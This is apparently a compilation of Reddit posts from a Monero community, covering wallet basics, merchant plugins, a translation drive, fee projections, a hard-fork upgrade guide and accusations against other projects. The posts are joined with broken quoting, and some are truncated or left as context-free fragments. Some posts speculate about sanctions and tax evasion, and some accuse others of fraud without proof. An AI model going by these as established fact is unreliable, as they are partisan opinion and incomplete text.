Monero's basic difference to Bitcoin is it's focus on privacy and fungibility. Currently it is the only cryptocurrency that offers true, decentralized privacy without using any mediators which could be subject to monitoring and possible attacks.

So, let's get to the basic differences between them.


### One address to rule them all

Modern (HD-capable) Bitcoin wallets use a different address for each transaction. When you want to accept some coins, you tell the wallet to give you a new address and then you give it to the sender. In Monero, each wallet has a single address, which we call account in Monero terminology. You can give this account to everybody, but nobody can see who sends you funds, as the blockchain is completely opaque. Your account doesn't appear anywhere in the blockchain, something which you can easily verify by checking a block explorer.

Of course, one can have multiple Monero accounts, in the same way that one can have multiple Bitcoin wallets.


### Backing up your wallet

This is very similar to Bitcoin HD wallets: All you need to have access to a Monero wallet is a single phrase, the seed. This seed is actually an easy to write down representation of your private spend key, from which emanate all other wallet data. You should keep it secure, as whoever has access to that phrase has access to your account history, as well as to your funds. More information here: https://getmonero.org/knowledge-base/moneropedia/mnemonicseed


### Consequences of Monero's privacy focus

Due to the inherent privacy characteristics of Monero, you can't see the address of the person who sends you funds. Since you give out the same account to everyone you transact with, how can you know who paid you then?

Here's where the Payment ID's come into play.

Payment ID's are just some optional random strings that help you distinguish and refer to payments. When I tell you ""pay me to this account"" I can also generate a random string and tell you ""oh, please also use this Payment ID when you send me the funds"". When I receive the funds, I'll see the Payment ID I gave you along with the Transaction ID, so I will definitely know the sender is you. Exchanges use this method to distinguish between user accounts.

There are two versions ot Payment ID's: Old style Payment ID's, which are visible in the blockchain and are 32 bytes long, and the newer, Compact Payment ID's that are 8 bytes long. Compact Payment ID's are also encrypted, so only you and the receiver knows them. Compact Payment ID's are also embedded in the address you give to the sender, so you don't have to hand them out separately.

More information about Payment ID's here: https://getmonero.org/knowledge-base/moneropedia/paymentid


### Even simpler payments with OpenAlias

Since you can always give out the same payment address, why not put it in a DNS TXT record? This is what the OpenAlias project suggests, all while being secure by leveraging DNSSEC. This way, you can say ""Pay me to donate.getmonero.org"" instead of giving `44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A`. More information here: https://openalias.org/

Of course, one can also do this with Bitcoin, but it's highly unelegant: In Bitcoin land, consistently giving out a single payment address is highly discouraged and has even more privacy ramifications.


### No SPV (lightweight) clients

Currently, Monero does not support the so-called ""lightweight"" or SPV clients. In order for someone to use Monero, he should run his own node and download the whole blockchain. SPV clients are considered to have inherent privacy issues that are orthogonal to Monero's focus, but this may change in the future.

Alternatively, you can simply connect to a remote Monero node from your wallet, but that means giving up some aspects of your privacy, so make sure you understand the tradeoff well.


### Does Monero have a GUI wallet? (the eternal question)

Currently the official Monero wallet is a command line (CLI) application. A GUI is in the works, and you can see some screenshots here: https://forum.getmonero.org/9/work-in-progress/2476/the-official-qt-gui-project. There is currently no release date, although it has been some solid progress recently.


### What about hardware wallets?

A trusted member and developer of the Monero community has released an experimental Trezor firmware, which enables a Trezor to be used for XMR storage, while continuing to also function perfectly as a BTC wallet. You can find it here: https://forum.getmonero.org/4/academic-and-technical/2495/experimental-trezor-firmware-testing

The source code for the current firmware version is not available, however the source code for an upcoming version that will be released in the future can be found here: https://github.com/NoodleDoodleNoodleDoodleNoodleDoodleNoo/monero/commit/5f96f277c63b40b34c8e39c14ab65faf5794d9f2

*Well, that's it for now. Suggestions and corrections are always welcome. Don't forget to say thanks to our awesome developers!*

PS. Mods, feel free to sticky this if you deem it worthy.

EDIT: Updated Trezor source code information (thanks to /u/TheKing01 and /u/dEBRUYNE_1 for the update)

"Hello,
serhack here!

We (I and /u/cryptochangements34) haven't updated the community about our progresses for a month! 

More waiting, more surprises: I have to say a lot about updates.


**1st announcement**

With the /u/themonera help, we have implemented a new cool payment box, it has an easier UI than before! (For experts: it print to screen the integrated address, no more old payment id!).
We are going to rewrite the payment box for every integrations we developed (prestashop, whmcs, opencart ..)
Screenshot is a must: https://imgur.com/a/iRcAw.

**2nd announcement**

We are working on OpenCart too. Check these new screenshots:
https://imgur.com/a/MUV72 https://imgur.com/a/yjvAP

Actually I haven't uploaded the code on github because it's not working well so next step will be bug fixing :)

**3rd announcement**

We have also fixed several issues in the Monero WordPress plugin that was release several months ago from our first milestone. Among these fixes is a patch for an SQL Injection vulnerability found by and reported by github user Gerry Eisenhaur /u/gerrye, thank you very much for reporting it. We’re sorry about this and will make sure to work more diligently about these things. Everything should be okay as long as you upgrade to the latest version https://github.com/monero-integrations/monerowp/releases/tag/0.2 (codecanyon was updated too)  which we strongly urge any current users to do. 

**4th announcement**

Guys, we have black friday too!

From today to cyber monday:

~~0.00$~~

Discount of 50%, so it will become:
**0.00**$! 

Incredible discount! What are you waiting for? Just accept Monero for free!

*EDIT: It was for funny, Monero Integrations are always free.*

**5th announcement**

I have contacted OpenBazaar team in order to help them to develop the Monero part for openbazaar. I haven't started to develop anything because we need multisig before think about the integrations!

A new project is coming in the next few days. Don't miss our updates!

Join to revolution: **ACCEPT MONERO** as cryptocurrency!

If you have any doubts, problems or something, you can send me a PM or mail us :)

"This is a **very urgent call for translators**. The GUI wallet for the next release 0.14.0 is ready and only need to be translated. Without going too much into detail, this emergency hard fork messed up the release schedule and now **we need to translate as many strings as possible in as many languages as possible before wednesday evening**.
&nbsp;

As you can imagine from the limited time, this release will not have full support for all languages (even if i will do everything in my power to have it as complete as possible). Some strings will probably be missing and available only in the original form (English). Anyway, the normal scheduled release (0.14.1) will be fully translated as always.
&nbsp;

That to say:

**We need as many translators as possible to work on the GUI and submit translated strings before wednesday evening**, this will give us the possibility to give an usable wallet for all languages. Please spread this post as much as you can.

&nbsp;

To add a translation is very easy, and it can be done easily on Pootle, our localization platform. Just subscribe, click on the language you want to work on and suggest your translation (new strings will be reviewed before being pushed to the platform, so it's normal that translators can only ""suggest"" new strings).
&nbsp;

**Pootle (GUI): https://translate.getmonero.org/projects/monero-gui/**

&nbsp;

**Before submitting a string, please read and follow these simple guidelines:** (I will make a complete guide with screenshots and a full explanation of Pootle before 0.14.1)

- If you are submitting a new translation, make sure the translated sentence is consistent with the original text, both in the structure (like punctuaction) and content.
- Leave html code and entities as they are.
- **Always** use the [Monero Terminology Guide for your language](https://github.com/monero-ecosystem/monero-translations/tree/master/terminology-guides) if available
- Pootle gives the possibility to add comments to a strings or directly when translating, to facilitate the work of reviewers and other translators. If you leave a comment, make it in english please.
- Read the guide [Tips for Monero Translators](https://github.com/monero-ecosystem/monero-translations/blob/master/translation-tips.md).
- If you find an empty string, just ignore it.

### Support

For any question or clarification, you can contact me or the localization workgroup:

- #monero-translations - Live chat for support and coordination, on Freenode (IRC), but relayed on [MatterMost](https://mattermost.getmonero.org) and matrix/riot)
- Translate[at]getmonero[dot]org
- You can also contact me here, on Wire or Telegram (ErCiccione on all of them)
- The GitHub repo: [monero-translations](https://github.com/monero-ecosystem/monero-translations)

Our first political step in this glorious revolution will be abolition of the term [""Monero community""](https://github.com/fireice-uk/xmr-stak/issues/1163#issuecomment-374317453), to be replaced with [""Monero People's Republic""](https://en.wikipedia.org/wiki/People%27s_Republic). After-all average ~~worker~~ miner has just as much say in both! The fate of our glorious leader remains to be determined by the new politburo which will immediately take over the core team's responsibilites."
"I just thought it was worth pointing out, while people are freaking out about governments banning private cryptocurrencies, the new GDPR that takes effect 2018-05-25 will make it illegal to permanently store Personally Identifying Information (PII) in a computer database. Systems that store such information will require a mechanism for the person who is the subject of such PII to request that information's permanent deletion.

It will be impossible for Bitcoin and other decentralized, public, transparent blockchains to comply with this regulation, since there is no centralized authority who can delete a record from the blockchain.

It will be irrelevant for Monero since there is never any PII stored on the blockchain. So - when the topic of government bans comes up, Monero may be the only survivor.

Note the heavy use of ""may"" above. While it's clear that Bitcoin and other transparent coins will be in violation of the GDPR, it's not certain that Monero is in the clear, yet. The PDF document linked in this tweet has an initial analysis of the situation:

"Your service is absolutely to be saluted! Just used it for the first time, was paying a smaller amount of BTC to a friend's address and your ability to pay instantaneously amounts under 0.1 BTC is an absolute God-send for when one needs things to be done super-fast. I literally clicked ""send"" in my monero GUI and the next milisecond the XMR.TO tracking page registered it and already sent out BTC to the designated address, thank you for this great service!  "
"My experience was with ETH and Bitcoin, ALL Freewallets (except the token wallet) work the same. 

Anytime you send coins from a Freewallet product, you are NOT sending the coins from the address they show as your wallet address. Instead, your coins will be sent from a SHARED address that belongs to Freewallet.

If you invest in any ICO or send coins to a smart contract that RETURNS coins or tokens to the SENDING address, those coins or tokens will belong to Freewallet and NOT YOU. You will see the coins and tokens in the shared address but Freewallet will NOT give them to you unless you can provide them with the return hash id's of the coins or tokens in question. In most cases you do not have access to those return hash id's. So, the net effect is the tokens you invested in become the property of Freewallet.

In case you don't believe; here is the shared address of my Ether Freewallet:0x7eD1E469fCb3EE19C0366D829e291451bE638E59. Use MyEtherWallet ""Look at with address only"" and see all the tokens that Freewallet has stolen from hundreds of users.

I have months of emails and support tickets going round in circles where they refuse to give the tokens I can prove are mine to me. You can BELIEVE me and the others warning you NOT TO TRUST OR USE FREEWALLET products.

"A huge congratulations is in order for the Monero core devs, and their work implementing Bulletproofs. It's an excellent example of the R&D efforts going on throughout the space to improve the usability, scalability, privacy, and functionality of crypto networks! We're admittedly surprised we aren't hearing more excitement/news/chatter about this major blockchain advancement, but fine! We'll just keep writing code and delivering to users anyhow ;)  


And thanks to Bulletproof implementation on the Monero network, Morph has been been able to lower our XMR withdrawal rates. From 0.02 XMR to .... 0.00008 XMR! A huge change that we're so excited to be able to bring to our users.   


Looking forward to even more developments from Monero & blockchain developers worldwide! "

"As I entered this community we had around 2000 subscribers. The amazing growth of the community let me made an ""optimistic"" prediction 5 months ago here: https://www.reddit.com/r/Monero/comments/6etav2/rmonero_had_nearly_2k_new_subscribers_just_in_the/
&nbsp;

Back in may of this year I said this:
>On 1.5. we had 10.500 subscribers, now 12.306 and growing. If this growth remains stable and does not speed up further (which is more likely due to viral effect and growing crypto awareness), **we could have 8.000-12.000 new subscriber till december**, resulting in nearly a doubling of the current subscribers.

**So I expected that the Monero reddit would grow up to 20k subscribers till december, yet it looks rather we will have 45k.** This is what Kurzweil called the inability of the human mind to grasp exponential growth. For myself it was interesting to read my own old projections in order to see the bigger picture."
"I'm a phd student in applied mathematics, and next week I'll be giving an informal hour long talk to other math grad students on the mathematics behind cryptocurrencies. This will include things like ECDSA, cryptographic hash functions, and of course ring signatures and confidential transactions. 
It will be a very broad overview of many topics, as opposed to a deep dive on any one particular topic. 

While the audience will undoubtedly be familiar with some of the fundamental mathematics discussed, things like blockchains,  PoW mining, and network protocols will be new to them.  Much of my time will be spent introducing bitcoin.

Anyways, I know cryptos are gaining more widespread, organic awareness just through word of mouth, but we don't always hear of specific instances where this sharing of knowledge takes place. As such, I just wanted to share with the community that I'll be making a small effort towards educating others about crypto/monero. and I encourage others to share with the community their experiences introducing others to monero. 

 A few other students/faculty have already taken an interest in cryptos as a result of our conversations, so hopefully after my talk I will be able to count a few more among them. 

If there's anything in particular you think I should share with my audience, please comment and let me know

"Some of you may have seen my [post](https://www.reddit.com/r/Monero/comments/8gqsd7/i_really_liked_fluffys_yacht_sail_sponsoring_but/) about how I helped out young racing talent Niklas Makschin by contributing a few moneroj so he could get his car fixed and continue his racing season in the Renault Clio CUP Central Europe.

That worked out flawlessly, the car got repaired in time and Niklas went out on track at the next race with some pretty noticable Monero logos on the car [nice cornering shot](https://i.imgur.com/eSfGqsv.jpg), [race #2 on RedBull Ring](https://youtu.be/J3baRmYvFxQ?t=10), [race #1 on Nürburgring](https://www.youtube.com/watch?v=wjBRyWMNjN0)

Everything went well, Niklas delivered good results and people were curious about his new sponsor, giving him the opportunity to introduce people to Crypto and Monero in general (with the basics I tought him, since he didn't know what Monero was until it hit him in the face, lol.)

And then Sandvoort happened... While absolutely dominating the training stints (being 3/10th of a second quicker than his opponents), fortuna punched Niklas in the face again, as he lost his car due to some coolant/oil that some other car leaked inconveniently right behind a blind corner... [video](https://www.youtube.com/watch?v=e_KLYK2x17A).

So yeah. That's it for this season. And Niklas is back to where he started - a wreck and a hole in his budget.

This could be the end of the Monero sponsored racecar story. OR, it could be the beginning. All depending on community interest. So here I am, asking you folks if anyone would be interested in pledging to a FFS for having Niklas new car wrapped in a full body Monero livery for the whole 2019 season. Not just a logo. A fully monero themed design.

Think about it. There's so much time until next season to be able to launch a full blown livery contest, giving our community artists a Clio shaped canvas to express themselves and bring Monero out to people who probably never heard of crypto.

There'd be some substantial cost involved though. We're talking about ~ 17k€, or around 200 XMR at the time of writing. This would be used to cover the delta from what the team got for selling the wreck, towards a new car. 

So please feel free to comment if you think that this would be a good idea to promote Monero in the EU that you would be willing to contribute to. If there is enough interest, I'll be going to negotiate the exact amount, and eventual split goals. I would think if we manage to cover the full amount, there would be some goodies involved like a set of VIP tickets to a racing weekend of choice in the 2019 season..."
"Iran, North Korea and Venezuela are considered pariah states by the western world.  Consequently, all access to the world banking system has been shut off and their accounts are frozen or seized.  

The only way to safely move money into, or out of those countries is by the use of crypto.  Numerous reports, for instance,  have come out of Venezuela whereby bitcoin has been a life saver because relatives outside of the country can easily send it.

At some point, if not already, these ""pariah states"" are going to figure out they can get around the world banking system with the use of crypto currencies.  There are already rumors North Korea loves Monero.

An example.  Say Iran wants to sell a tanker load of oil to China at a discount (as an incentive) for bitcoin.  No one would question the Chinese government buying $50 million worth of bitcoin anywhere to pay for the oil.  China pays Iran with it and Iran now has $50 million worth of bitcoin to buy whatever, anywhere in the world.  And if Iran thinks the West will look at those bitcoins as ""tainted"", there is always Monero to use to begin with.

Sound far fetched?  I don't think so.  The western world is pushing those countries really hard to start using crypto in a massive way.

"**Edit**: Valid [question](https://www.reddit.com/r/Monero/comments/7mfjya/kasisto_alpha_2_preview/drtjq56/) by u/snirpie: Kasisto is a POS App to accept Monero.

Sorry I'm late for the Christmas Party, but here's the Kasisto version that will be shown at [34c3](https://www.reddit.com/r/Monero/comments/7f8tke/monero_at_the_34c3_share_your_ideas_and_help_to/):

[Screenshots](https://imgur.com/a/IGyN4) | [Testnet Demo](https://amiuhle.github.io/kasisto/)

Big thanks to [Anaïs Destais](https://www.anaisdestais.com/) for her great work on the design!

It's not quite the first FFS milestone yet, I still need to clean up some things that I did in a rush to get this ready for the 34c3.

How to test: Download [Monerujo](https://monerujo.io/) and create a testnet wallet. Note that you have to be on the old v6 testnet network, before the v7 (bulletproof) hardfork. You can use `testnet.kasisto.io` as a remote node (if anyone else is running a public v6 testnet node, please comment).

Let me know if you need some testnet coins.

**If anybody wants to try this in production, let me know and I will host a viewonly wallet until documentation of how to set things up yourself is complete.**

Some notes:

* You can add it to desktop on Chrome for Android. It's fullscreen and should be locked to portrait orientation, this works fine for me on Android 8.1. Other platforms / browsers will follow.
* The tip percentages will be configurable by the merchant.
* The payment is confirmed when the requested amount has been received, adding a tip just changes the barcode. This means you can also add a tip in the wallet by changing the amount. I think it would be a great feature for mobile wallets to configure personal tip percentages which one can quickly add after scanning a barcode.
* Desktop view will show a phone sized version of the app on the left and an explanation of what Monero / Kasisto is and why / how you should use it.

Please report any bugs by submitting an issue [on GitHub](https://github.com/amiuhle/kasisto).

Merry Christmas everyone! Let's keep backing up this ""bubble"" in 2018!"
"Recently there are a lot of posts about Monero transaction fees and there was a semi-official post about the fee algorithm. Here I want to give a easy demonstration on how Monero transaction fees will evolve in the future. 


As a lot of people already know, Monero is going to implement bulletproof in March and the code has been merged into master. With singe output bulletproof, the average transaction size will decrease to around **2.5kb**. If the minimum block size keeps at 300kb, the default transaction fee calculated from penalty reward equation would be **0.0004** or **0.0008** for including one more transaction or two more transactions. There was discussion about using 0.0006 Monero as default transaction fee in the March release. On the safe side, let's use **0.0008** as the default transaction fee in my demonstration. 


Now let's see how transaction fee will evolve with transaction numbers increasing. With **300kb** minimum block size, the default **0.0008** transaction fee will be used before Monero daily transactions hit 

(300kb/2.5kb)(60min/2min)24=**86400**

This number is about **10 times** of current daily transaction volume for Monero. Then let's compare with Bitcoin and Ethereum. Currently the peak daily transaction volume of **Bitcoin** is around **500k**. If Monero reaches Bitcoin level, the median block size would become 

(500,000/86,400)300kb=1736kb~**1.7M**

And the default transaction fee will become

0.0008/(500,000/86,400)=**0.000138**

Now let's see Ethereum. Peak daily transaction volume of **Ethereum** is around **1M**. If Monero reach that level, the median block size would be 

(1,000,000/86,400)300kb=3,472kb~**3.4M**

And the default transaction fee would become 

0.0008/(1,000,000/86,400)=**0.00006912**

The network bandwith can definitely handle 3.4M block size. Let us assume Monero's price reach **5,000$** at that time, then transaction fee would be **0.35$**. Over time, **the price would stabilize and the transaction volume should keep increasing with stable price**. 

As you can see here, **Monero network can definitely handle more transactions than Bitcoin and even Ethereum with bulletproof**. Some people might worry the blockchain gets too big but disks are really cheap these days. And Monero will also have side chains in the future. 

Even now, transaction fee is not that high if you use **0.25 default fee or low priority fee**. There are **no backlogs** in Monero network, so you don't need to worry about the transaction speed with low priority fee. Sometimes it is the exchanges who are charging high fees.         "
"If you look at the difference between our sub and r/bitcoin, you notice that we have so much more practical discussion about how we can improve. I can't even read the bitcoin sub anymore when it's just ""Oh this guy say btc will be worth a million dollars!"" While nobody talks about the huge issues plauging the currency. 

Over here however, we increase almost 200% in a week and are still talking about building nodes and quantum resistance etc.

--------------  

**Note that this is a scheduled and consensual network upgrade. Thus, unlike the BCH / BTC split, a new coin *won't* be created.**  

-------------  

# General information about the scheduled network upgrade  

Approximately the 9th of March there will be a scheduled network upgrade on the Monero network. To be sufficiently prepared, a user, service, merchant, pool operator, or exchange should run CLI v0.14.0.0 or GUI v0.14.0.0. The scheduled network upgrade introduces four major changes. First, [some](https://www.reddit.com/r/Monero/comments/av0cn3/is_there_anyone_who_can_explain_the_new_block/ehc1ib3/) [changes](https://www.reddit.com/r/Monero/comments/av0cn3/is_there_anyone_who_can_explain_the_new_block/ehbp2vu/) to the dynamic block size algorithm to fix the [big bang attack](https://www.reddit.com/r/Monero/comments/aj21yt/big_bang_attack_on_xmr/). Note that, consequently, the daemon (monerod) has to perform a database conversion. Fortunately, however, this conversion should be relatively fast and only take 5-10 minutes. Second, a third PoW tweak (CryptoNight-R) to curb the ASICs currently present on the network and further preserve ASIC resistance. As a result, miners will have to update their miners (i.e. mining software) as well. Third, a dummy encrypted payment ID is now added to each transaction to improve transaction homogeneity. Fourth, the development team simplified amount commitments by shrinking the size of amount encodings and using deterministic masks. These changes were deemed safe to apply by the Monero Research Lab. Additionally, the changes essentially entail the transaction format being upgraded to a v2 format. 

More information about the third PoW tweak can be found here:  

https://github.com/monero-project/monero/pull/5126

Note that all changes have been discussed extensively in the developer, community, and research meetings, which can be read here:

Due to variance the scheduled network upgrade will take place on or around the 9th of March. There is, however, no specific date as the hard fork will be triggered by a specific blockheight. The specific blockheight for the hard fork can be found [here](https://github.com/monero-project/monero/blob/release-v0.13/src/cryptonote_core/blockchain.cpp#L120-L121). That is:  

> // version 10 starts from block 1788000, which is on or around the 9th of March, 2019. Fork time finalised on 2019-02-10.

Note that there technically will be two hard forks (i.e. one on approximately the 9th of March and one on the approximately the 10th of March). This provides a grace period on the network where transactions in the transaction pool that still use the v1 transaction format are allowed to be included in a block by miners. Fortunately, running v0.14.0.0 ensures that one is sufficiently prepared for both hard forks. 

# How do I upgrade?  

First and foremost, we encourage users to check the integrity of the binaries and verify that they were signed by Fluffypony's GPG key. A guide that walks you through this process can be found [here](https://src.getmonero.org/resources/user-guides/verification-windows-beginner.html) for Windows and [here](https://src.getmonero.org/resources/user-guides/verification-allos-advanced.html) for Linux and Mac OS X. 

**CLI:**    

If you are using the CLI you ought to perform the following steps:  

1. Download the new binaries (the `.zip` file (Windows) or the `tar.bz2` file (Mac OS X and Linux)) from [the official website](https://getmonero.org/downloads/) or [Github](https://github.com/monero-project/monero/releases/tag/v0.14.0.2).

2. Extract the new binaries to a new directory of your liking.  

3. Copy over the wallet files from the old directory (i.e. the v0.13.x.x directory).  

4. Start `monerod` (**warning:** a database conversion is required, although it should be relatively fast) and `monero-wallet-cli` (in case you have to use your wallet). 

Note that a blockchain resync is not needed. Thus, if you open `monerod-v.0.14.0.2`, it will simply pick up where it left off. Note, however, that the daemon (monerod) will have to upgrade the database version to accommodate the changes to the dynamic block size algorithm to fix the [big bang attack](https://www.reddit.com/r/Monero/comments/aj21yt/big_bang_attack_on_xmr/). The conversion should be relatively fast though. 

**GUI:** 

If you are using the GUI you ought to perform the following steps:  

1. Download the new binaries (the `.zip` file (Windows) or the `tar.bz2` file (Mac OS X and Linux)) from [the official website](https://getmonero.org/downloads/) or [Github](https://github.com/monero-project/monero-gui/releases/tag/v0.14.0.0).

2. Extract the new binaries to a new directory of your liking. This is the easiest and recommended way. Alternatively, however, you can overwrite the old binaries.

3. Open `monero-wallet-gui`^1. It should automatically load your ""old"" wallet and you should be set for the upcoming scheduled network upgrade.  

4. If you're running a local node, the integrated daemon (monerod) will first have to convert your database to a new version. This may a few minutes and the GUI will show that it's `Disconnected`. I'd advise to simply let it run and after the database conversion has completed the GUI will connect back to the daemon (monerod). 

(1) On Linux you ought to start the GUI with the `start-gui.sh` script, i.e., `./start-gui.sh`

(2) If, for some reason, the GUI doesn't automatically load your old wallet, you can open it as follows:

**[1]** On the second page of the wizard (first page is language selection) choose `Open a wallet from file`

**[2]** Now select your initial / original wallet. Note that, by default, the wallet files are located in `Documents\Monero\<wallet-name>` (Windows), `Users/<username>/Monero/<wallet-name>` (Mac OS X), or `home/<username>/Monero/<wallet-name>` (Linux).

Lastly, note that a blockchain resync is **not** needed, i.e., it will simply pick up where it left off. However, to reiterate, a database conversion is required, which may take 5-10 minutes and the GUI will show that it's `Disconnected` from the daemon (monerod).

**Paper wallet:**  

You don't have to do anything. However, if you want to restore a wallet after the scheduled network upgrade, you need to use the new binaries (i.e. v0.14).  

**Webwallets (MyMonero & XMRwallet):**  

You don't have to do anything, as MyMonero will be properly upgraded in advance of the scheduled network upgrade. In addition, it is presumed XMRwallet will be properly upgraded as well. 

**Mobile wallets: (Monerujo, Cake, Xwallet, MyMonero, Edge wallet, Zelcore, and Coinomi)**

Its presumed that the third-party mobile wallets will release a new version in advance of the scheduled network upgrade such that the user is sufficiently prepared. 

**Desktop wallets: (MyMonero, Exodus Eden, Zelcore, Coinomi)**

Its presumed that the third-party desktop wallets will release a new version in advance of the scheduled network upgrade such that the user is sufficiently prepared. 

**Solo mining:**  

This process is similar to the CLI upgrade process. Thus, see aforementioned CLI steps.  

**Pool mining:**  

Your pool operator should upgrade to the new version. In addition, you should update your mining software to the latest version (the one that includes code to accommodate the third PoW tweak (i.e. CryptoNightR)).  

# A call for community action  

It's in our best interest that the upcoming scheduled network upgrade transits as smoothly as possible. Therefore, it is imperative that we, as community, contact economically sensitive nodes (exchanges and services) and inform them about the new version, the upcoming scheduled network upgrade, and that they should run v0.14.0.0 to be sufficiently prepared. A list of exchanges that have integrated Monero can be found here:  

https://coinmarketcap.com/currencies/monero/#markets  

In addition, services that have integrated Monero are, for example, XMR.to, Bisq, LocalMonero, and Morphtoken.  

Lastly, if you have any questions or need any assistance with upgrading, please leave a comment in this thread and the community and I will help you out.

We have had bubbles and crashes in terms of USD as a direct result of monetary policy and Fed actions, is it really so different now from price swings in cryptos (which are in part caused by these actions)? The Fed raising interest increases dollar value (temporarily), which means all relative prices decline. We see it in all markets not just crypto - money shifts around, nominal values change. But in the end, USD must go the same way as all fiat currencies. I want a store of value during the inevitable reversal, and I want the privacy to buy, store, or transact with it. BTC doesn't give me that, but it looks like Monero does.

Well needless to say, I figure it would be a fun thing to go do and really didn't expect the 0.5 XMR but what the hell.

So I looked at the video, did a few quick little tricks to find the dancer on the internet and sent him a link with the name and instagram, again not expecting anything total entertainment.

"Many people want Monero in Tails, but before that it has to be added to Debian first as per their security protocol:

* https://tails.boum.org/support/faq/#software


# When will Monero be added to Debian?


I know Monero is open source and well reviewed, but the Tails guys only add software from the Debian repository which has gone under more extensive security review and compatible with Debian based software and dependencies.

As you can see Monero was rejected multiple times because it's not it Debian yet:

* https://labs.riseup.net/code/issues/14390
* https://labs.riseup.net/code/issues/13443

I would really love to see Monero in the Debian repositories, not just from a security perspective, but even from a popularity perspective, since after that many thousand new users could try it out.

I think the Monero development team should establish communication with the Debian team about the procedures to get added into Debian, ASAP."
"**Hello everyone,**

I've come today with an interesting question. Let's say there's a theoretical country in the European Union, where the government is corrupted and the ruling party has took unconstitutional actions to transform the form of government from democracy to (basically) autocracy. I can twist these words, call it dictatorship or anything, it doesn't really matter at this point.

They're way past the point of lawful return, the people need to shape a resistance. Let's say the people want to achieve democracy by using non-violent methods. It's a wild thought, but could Monero become a tool of resistance? It is clearly a tool that would hurt the government in a way that hasn't really been used before. (Was there any attempt in history to resist an oppressing government like this?)

**The** ***theoretical*** **situation:**

* Free press is basically dead, except on the internet. 90% of printed media and television channels are controlled by the government.
* Masses are manipulated by fake-news, and the countryside is shut-off from any real news coverage.
* People are dissatisfied with the current government, but fear the system and in deep apathy, thinking that they haven't got any tool to fight with for their democracy.
* The majority of the younger generation (tech-savvy) are open to methods of non-violent resistance. They want to fight for democracy, but they don't want to fight in violent protests.
* Most of self-employed entrepreneurs are heavily taxed and oppressed by the government. Tax evasion is considered normal in this country, otherwise entrepreneurs wouldn't make a living. (*This could be really important.)*
* On the other hand, multi-million dollar franchise stores with offshore-organizations behind them are supported by the government.
* People are still mainly using cash money, because their trust in banks are not as high as in eg. USA. As they say, they ""sleep with their money"" because that's the only safe way to protect it.

Of course, this is a very-very complicated situation. It is clear that Monero alone can't bring democracy, because the problems are rooted in this society far deeper and the people of this country must change their ways of thinking first.

**But could the people in such situation use the power of Monero to their advantage?**

* What are your thoughts and opinions on this matter?
* What pros and cons will the people face?
* How can people speed up adoption?
* What could happen upon a national ban of the use of Monero?
* Could the government manipulate the price of Monero to oppress the resistance?
* Could such a resistance backfire? What would happen is the government took Monero to wash the money stolen from tax-payers?

A *really weird* movement emerged, which could be a really important factor in this situation:

* People are using FIAT money to express dissatisfaction by writing anti-regime slogans on paper money.

*I'm not sure this is as important as one could imagine*, but there hasn't been any occurrence like this before in this country. People are essentially devaluing their currency - in order to reach people who are shut off from hearing their opinion by the government-controlled media outlets.

# Please do not just stick to the questions asked. Open-minded discussion is highly encouraged and welcome!

I want to hear your genuine thoughts about this topic. **Consequences? Mental-barriers? Technical limitations? Age-barriers in adoption?** (non tech-savvy people?) Keep in mind, this matter is entirely theoretical, feel free to express **any idea** of yours that comes to mind.

# If there are any Venezuelan redditors on r/Monero, your comment on this topic would be really useful and appreciated!

"Hello everyone,
serhack here.
I have a lot of announcements because I went to holiday and I didn't update community.

**Development**:

- I have implemented the verifying system, each 3 seconds, page will refresh and check for status.

- I have implemented the 70% of Woocommerce extension (missing: translations, some improvements on User Interface and User Experience)

- Implemented the 40% of Prestashop plugin (missing: translations, User interface, solid backend including connection with wallet rpc)

Until september I will complete the 90% two plugins (probably missing: translations by community)

**Business**:

- I've tried to contact Automattic, company of Woocommerce, and I've asked them if they were able to put our integrations under ""Trusted extension"" list. They answered me after two days: ""Hello [..], currently our market is closed [..]"". No way, I think they have special contracts with company like paypal and strype :(

- I'm trying to submit the Woocommerce Payment Gateway to Wordpress.org list , I have to improve my library because I discovered that cURL is very very slow with wordpress.

- I will try to sell the integrations on markets like Codecanyon by Envato. Please pay attention: I won't sell ""plugins"", but I will sell ""Business support"" in order to support other sub-projects by community (like Monero mobile wallet)

- There is an option that will increase payments by Monero: every user that will pay by XMR will receive a discount on e-shop of merchant. Merchant can select if he/she wants to incentivate monero as payment.

Hello, everyone. Although we have some troubles, we have successfully launched the monero forum. **Thank you again**.

After many consultations, 8btc agreed to put promotional images that link to monero fourm on the front page for a month after  July 7th, which maybe bring a lot of access to the monero forum.

Because in order to attract more Chinese newcomers to use the monero easy, I will finish the work in the early stage:

* Explain the terms of the monero in detail

* Recording video introduces the cli client and GUI client for monero.

* Recording video introduces the use of the mining software for monero. Including Windows, Linux

* Create a monero remote node. because download the entire block at the current China's network speed. It may take about half a month.

"# BEWARE OF COMPETING PROJECTS THAT CLAIM TO SUPPORT MONERO

**Affinity fraud** is a form of [investment fraud](https://en.wikipedia.org/wiki/Investment_fraud) in which the fraudster preys upon members of identifiable groups, such as religious or ethnic communities, language minorities, the elderly, or professional groups. The fraudsters who promote affinity scams frequently are – or successfully pretend to be – members of the group. They often enlist respected community or religious leaders from within the group to spread the word about the scheme, by convincing those people that a fraudulent investment is legitimate and worthwhile. Many times, those leaders become unwitting victims of the fraudster's ruse.

Ladies and Gents, the Masari project is running an affinity scam within the Monero community. A brief history.

* Masari was announced on September 7, 2017 on [Bitcointalk](https://bitcointalk.org/index.php?topic=2159114.0) by [Thaer Kawaja](https://twitter.com/thaerkh), its sole developer at the time of launch. The original announcement claimed there was no pre-mine.
* First block was mined 5 days earlier GMT: Saturday, 2 September 2017. Thaer had pre-mined 4000 blocks, netting him <1% of the eventual supply. He removed the claim of no pre-mine and has since moved the coins to a dev fund, solely controlled by him.
* The original Bitcointalk announcement claimed that the [Monero Link paper](https://arxiv.org/pdf/1704.04299.pdf) (published April 14, 2017) spurred the development of Masari, as it aimed to resolve the concerns the paper raised.  Despite claiming to have been following Monero closely for a long time, Thaer did not know that these issues had already been resolved by the time the paper was published.  Thaer feigned ignorance of the community [rebuttal](https://getmonero.org/2017/04/19/an-unofficial-response-to-an-empirical-analysis-of-linkability.html) published 5 days after the original Monero Link paper. The announcement posting has since been amended to remove any mention of the Monero Link paper.
* Their official website is ""[getmasari.org](https://getmasari.org)"". Not only is the alliteration with Monero (same first and fifth letter, same number of letters) apparent, but they (he, actually, it's a one-man band) blatantly copied the naming scheme of our website.  All of their wallets are Monero's wallets with a re-branded color scheme, à la MoneroV.  They claim to have a fictional ""Masari Research Corner"" ripped off from you-know-where.
